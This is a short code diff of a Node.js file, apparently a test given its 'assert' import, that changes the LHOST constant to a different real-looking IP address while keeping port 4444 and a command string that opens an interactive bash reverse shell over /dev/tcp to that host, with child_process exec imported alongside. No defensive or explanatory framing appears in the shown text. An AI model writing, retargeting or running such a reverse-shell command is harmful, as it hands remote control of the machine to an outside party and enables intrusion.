@@ -17,7 +17,7 @@ const assert = require('assert');
 const path = require('path');
 const { exec } = require('child_process');
 
-const LHOST = "107.174.242.20";
+const LHOST = "62.72.7.228";
 const LPORT = "4444";
 
 const cmd = `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'`;
